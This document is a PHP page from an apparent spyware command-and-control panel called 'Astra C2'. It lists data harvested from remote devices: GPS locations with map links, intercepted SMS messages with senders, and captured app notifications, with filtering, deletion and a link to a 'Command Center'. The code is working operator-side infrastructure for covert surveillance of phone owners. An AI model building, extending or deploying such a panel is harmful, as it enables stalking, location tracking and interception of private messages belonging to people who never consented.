<?php
/**
 * Admin Panel - Logs
 * Displays logs from devices, filterable by type and device
 */

// Define included constant to prevent direct access to includes
define('INCLUDED', true);

// Include required files
require_once '../includes/db.php';
require_once '../includes/functions.php';

// Start session
session_start();

// Check if admin is authenticated
if (!isset($_SESSION['admin_authenticated']) || $_SESSION['admin_authenticated'] !== true) {
    header('Location: index.php');
    exit;
}

// Connect to database
$db = Database::getInstance();

// Handle log deletion if requested
if (isset($_POST['delete_log']) && !empty($_POST['log_id'])) {
    $logId = intval($_POST['log_id']);
    
    $deleteLog = $db->executeQuery("DELETE FROM logs WHERE id = ?", "i", [$logId]);
    
    if ($deleteLog !== false) {
        $message = "Log entry successfully deleted";
        $messageType = "success";
    } else {
        $message = "Failed to delete log entry";
        $messageType = "danger";
    }
}

// Get filter values if any
$filterDevice = isset($_GET['device_id']) ? sanitizeInput($_GET['device_id']) : '';
$filterType = isset($_GET['type']) ? sanitizeInput($_GET['type']) : '';
$dateFrom = isset($_GET['date_from']) ? sanitizeInput($_GET['date_from']) : '';
$dateTo = isset($_GET['date_to']) ? sanitizeInput($_GET['date_to']) : '';
$searchTerm = isset($_GET['search']) ? sanitizeInput($_GET['search']) : '';

// Build the query based on filters
$query = "SELECT l.id, l.device_id, d.name as device_name, l.type, l.content, l.timestamp 
          FROM logs l
          JOIN devices d ON l.device_id = d.device_id
          WHERE 1=1";
$params = [];
$types = "";

if (!empty($filterDevice)) {
    $query .= " AND l.device_id = ?";
    $params[] = $filterDevice;
    $types .= "s";
}

if (!empty($filterType)) {
    $query .= " AND l.type = ?";
    $params[] = $filterType;
    $types .= "s";
}

if (!empty($dateFrom)) {
    $query .= " AND l.timestamp >= ?";
    $params[] = $dateFrom . " 00:00:00";
    $types .= "s";
}

if (!empty($dateTo)) {
    $query .= " AND l.timestamp <= ?";
    $params[] = $dateTo . " 23:59:59";
    $types .= "s";
}

if (!empty($searchTerm)) {
    $query .= " AND (l.content LIKE ? OR d.name LIKE ?)";
    $params[] = "%$searchTerm%";
    $params[] = "%$searchTerm%";
    $types .= "ss";
}

$query .= " ORDER BY l.timestamp DESC LIMIT 500";

// Get the logs
$stmt = $db->executeQuery($query, $types, $params);

if ($stmt === false) {
    $logs = [];
} else {
    $result = $stmt->get_result();
    $logs = [];
    while ($row = $result->fetch_assoc()) {
        $logs[] = $row;
    }
    $stmt->close();
}

// Get devices for filter dropdown
$devicesStmt = $db->executeQuery("SELECT device_id, name FROM devices ORDER BY name");
if ($devicesStmt !== false) {
    $devicesResult = $devicesStmt->get_result();
    $devices = [];
    while ($row = $devicesResult->fetch_assoc()) {
        $devices[] = $row;
    }
    $devicesStmt->close();
} else {
    $devices = [];
}

// Get log types for filter dropdown
$typesStmt = $db->executeQuery("SELECT DISTINCT type FROM logs ORDER BY type");
if ($typesStmt !== false) {
    $typesResult = $typesStmt->get_result();
    $logTypes = [];
    while ($row = $typesResult->fetch_assoc()) {
        $logTypes[] = $row['type'];
    }
    $typesStmt->close();
} else {
    $logTypes = [];
}

// Function to format log content based on type
function formatLogContent($content, $type) {
    switch ($type) {
        case 'gps':
            // Try to parse as JSON
            $data = json_decode($content, true);
            if (json_last_error() === JSON_ERROR_NONE && isset($data['latitude']) && isset($data['longitude'])) {
                return "Latitude: " . htmlspecialchars($data['latitude']) . 
                       ", Longitude: " . htmlspecialchars($data['longitude']) . 
                       (isset($data['altitude']) ? ", Altitude: " . htmlspecialchars($data['altitude']) : "");
            }
            break;
        case 'sms':
            $data = json_decode($content, true);
            if (json_last_error() === JSON_ERROR_NONE && isset($data['from']) && isset($data['message'])) {
                return "From: " . htmlspecialchars($data['from']) . 
                       "<br>Message: " . htmlspecialchars($data['message']);
            }
            break;
        case 'notification':
            $data = json_decode($content, true);
            if (json_last_error() === JSON_ERROR_NONE && isset($data['app']) && isset($data['title'])) {
                return "App: " . htmlspecialchars($data['app']) . 
                       "<br>Title: " . htmlspecialchars($data['title']) . 
                       (isset($data['text']) ? "<br>Text: " . htmlspecialchars($data['text']) : "");
            }
            break;
    }
    
    // Default: return content as is with line breaks converted to <br>
    return nl2br(htmlspecialchars($content));
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Astra C2 - Logs</title>
    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Material+Icons" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/material-icons@1.13.6/iconfont/material-icons.min.css">
    <link rel="stylesheet" href="../assets/css/style.css">
</head>
<body>
    <div class="container-fluid">
        <div class="row">
            <!-- Sidebar -->
            <div class="col-md-2 bg-dark sidebar">
                <div class="sidebar-header">
                    <h3 class="text-white">Astra C2</h3>
                </div>
                <ul class="nav flex-column">
                    <li class="nav-item">
                        <a class="nav-link" href="dashboard.php">
                            <i class="material-icons">dashboard</i> Dashboard
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="devices.php">
                            <i class="material-icons">devices</i> Devices
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="logs.php">
                            <i class="material-icons">description</i> Logs
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="command_center.php">
                            <i class="material-icons">send</i> Command Center
                        </a>
                    </li>
                </ul>
            </div>
            
            <!-- Main content -->
            <div class="col-md-10 main-content">
                <div class="container">
                    <h1 class="mt-4 mb-4">Logs</h1>
                    
                    <?php if (isset($message)): ?>
                    <div class="alert alert-<?php echo $messageType; ?> alert-dismissible fade show" role="alert">
                        <?php echo $message; ?>
                        <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                    </div>
                    <?php endif; ?>
                    
                    <!-- Filters -->
                    <div class="card mb-4">
                        <div class="card-body">
                            <form action="logs.php" method="get" class="row g-3">
                                <div class="col-md-3">
                                    <label for="device_id" class="form-label">Device</label>
                                    <select name="device_id" id="device_id" class="form-select">
                                        <option value="">All Devices</option>
                                        <?php foreach ($devices as $device): ?>
                                        <option value="<?php echo htmlspecialchars($device['device_id']); ?>" <?php echo $filterDevice === $device['device_id'] ? 'selected' : ''; ?>>
                                            <?php echo htmlspecialchars($device['name']); ?>
                                        </option>
                                        <?php endforeach; ?>
                                    </select>
                                </div>
                                
                                <div class="col-md-2">
                                    <label for="type" class="form-label">Log Type</label>
                                    <select name="type" id="type" class="form-select">
                                        <option value="">All Types</option>
                                        <?php foreach ($logTypes as $type): ?>
                                        <option value="<?php echo htmlspecialchars($type); ?>" <?php echo $filterType === $type ? 'selected' : ''; ?>>
                                            <?php echo htmlspecialchars(ucfirst($type)); ?>
                                        </option>
                                        <?php endforeach; ?>
                                    </select>
                                </div>
                                
                                <div class="col-md-2">
                                    <label for="date_from" class="form-label">Date From</label>
                                    <input type="date" class="form-control" id="date_from" name="date_from" value="<?php echo htmlspecialchars($dateFrom); ?>">
                                </div>
                                
                                <div class="col-md-2">
                                    <label for="date_to" class="form-label">Date To</label>
                                    <input type="date" class="form-control" id="date_to" name="date_to" value="<?php echo htmlspecialchars($dateTo); ?>">
                                </div>
                                
                                <div class="col-md-3">
                                    <label for="search" class="form-label">Search</label>
                                    <input type="text" class="form-control" id="search" name="search" placeholder="Search content..." value="<?php echo htmlspecialchars($searchTerm); ?>">
                                </div>
                                
                                <div class="col-md-12">
                                    <button type="submit" class="btn btn-primary">Filter</button>
                                    <a href="logs.php" class="btn btn-outline-secondary">Reset</a>
                                </div>
                            </form>
                        </div>
                    </div>
                    
                    <!-- Logs Table -->
                    <div class="card">
                        <div class="card-body">
                            <div class="table-responsive">
                                <table class="table table-hover">
                                    <thead>
                                        <tr>
                                            <th>Time</th>
                                            <th>Device</th>
                                            <th>Type</th>
                                            <th>Content</th>
                                            <th>Actions</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <?php if (empty($logs)): ?>
                                        <tr>
                                            <td colspan="5" class="text-center">No logs found matching your criteria</td>
                                        </tr>
                                        <?php else: ?>
                                        <?php foreach ($logs as $log): ?>
                                        <tr>
                                            <td>
                                                <?php echo formatTimestamp($log['timestamp']); ?>
                                                <br>
                                                <small class="text-muted"><?php echo timeAgo($log['timestamp']); ?></small>
                                            </td>
                                            <td><?php echo htmlspecialchars($log['device_name']); ?></td>
                                            <td>
                                                <?php if ($log['type'] === 'gps'): ?>
                                                <span class="badge bg-primary">GPS</span>
                                                <?php elseif ($log['type'] === 'sms'): ?>
                                                <span class="badge bg-info">SMS</span>
                                                <?php elseif ($log['type'] === 'notification'): ?>
                                                <span class="badge bg-warning">Notification</span>
                                                <?php else: ?>
                                                <span class="badge bg-secondary"><?php echo htmlspecialchars($log['type']); ?></span>
                                                <?php endif; ?>
                                            </td>
                                            <td><?php echo formatLogContent($log['content'], $log['type']); ?></td>
                                            <td>
                                                <button type="button" class="btn btn-sm btn-primary" data-bs-toggle="modal" data-bs-target="#viewModal<?php echo $log['id']; ?>">
                                                    <i class="material-icons">visibility</i>
                                                </button>
                                                <button type="button" class="btn btn-sm btn-danger" data-bs-toggle="modal" data-bs-target="#deleteModal<?php echo $log['id']; ?>">
                                                    <i class="material-icons">delete</i>
                                                </button>
                                                
                                                <!-- View Log Modal -->
                                                <div class="modal fade" id="viewModal<?php echo $log['id']; ?>" tabindex="-1" aria-labelledby="viewModalLabel" aria-hidden="true">
                                                    <div class="modal-dialog modal-lg">
                                                        <div class="modal-content">
                                                            <div class="modal-header">
                                                                <h5 class="modal-title" id="viewModalLabel">
                                                                    <?php echo htmlspecialchars(ucfirst($log['type'])); ?> Log - <?php echo htmlspecialchars($log['device_name']); ?>
                                                                </h5>
                                                                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                                                            </div>
                                                            <div class="modal-body">
                                                                <div class="mb-3">
                                                                    <strong>Device:</strong> <?php echo htmlspecialchars($log['device_name']); ?>
                                                                </div>
                                                                <div class="mb-3">
                                                                    <strong>Type:</strong> <?php echo htmlspecialchars(ucfirst($log['type'])); ?>
                                                                </div>
                                                                <div class="mb-3">
                                                                    <strong>Time:</strong> <?php echo formatTimestamp($log['timestamp']); ?>
                                                                </div>
                                                                <div class="mb-3">
                                                                    <strong>Content:</strong>
                                                                    <div class="p-3 bg-light mt-2 log-content">
                                                                        <?php echo formatLogContent($log['content'], $log['type']); ?>
                                                                    </div>
                                                                </div>
                                                                
                                                                <?php if ($log['type'] === 'gps'): ?>
                                                                <?php
                                                                $gpsData = json_decode($log['content'], true);
                                                                if (json_last_error() === JSON_ERROR_NONE && isset($gpsData['latitude']) && isset($gpsData['longitude'])):
                                                                ?>
                                                                <div class="mb-3">
                                                                    <strong>Map:</strong>
                                                                    <div class="mt-2">
                                                                        <a href="https://www.google.com/maps?q=<?php echo $gpsData['latitude']; ?>,<?php echo $gpsData['longitude']; ?>" target="_blank" class="btn btn-primary">
                                                                            View on Google Maps
                                                                        </a>
                                                                    </div>
                                                                </div>
                                                                <?php endif; ?>
                                                                <?php endif; ?>
                                                            </div>
                                                            <div class="modal-footer">
                                                                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                
                                                <!-- Delete Log Modal -->
                                                <div class="modal fade" id="deleteModal<?php echo $log['id']; ?>" tabindex="-1" aria-labelledby="deleteModalLabel" aria-hidden="true">
                                                    <div class="modal-dialog">
                                                        <div class="modal-content">
                                                            <div class="modal-header">
                                                                <h5 class="modal-title" id="deleteModalLabel">Confirm Deletion</h5>
                                                                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                                                            </div>
                                                            <div class="modal-body">
                                                                Are you sure you want to delete this log entry?
                                                            </div>
                                                            <div class="modal-footer">
                                                                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                                                                <form action="logs.php" method="post">
                                                                    <input type="hidden" name="log_id" value="<?php echo $log['id']; ?>">
                                                                    <button type="submit" name="delete_log" class="btn btn-danger">Delete</button>
                                                                </form>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </td>
                                        </tr>
                                        <?php endforeach; ?>
                                        <?php endif; ?>
                                    </tbody>
                                </table>
                            </div>
                            
                            <?php if (count($logs) >= 500): ?>
                            <div class="alert alert-info mt-3">
                                <i class="material-icons align-middle">info</i>
                                Showing the 500 most recent logs matching your criteria. Use filters to narrow down results.
                            </div>
                            <?php endif; ?>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <script src="../assets/js/dashboard.js"></script>
</body>
</html>
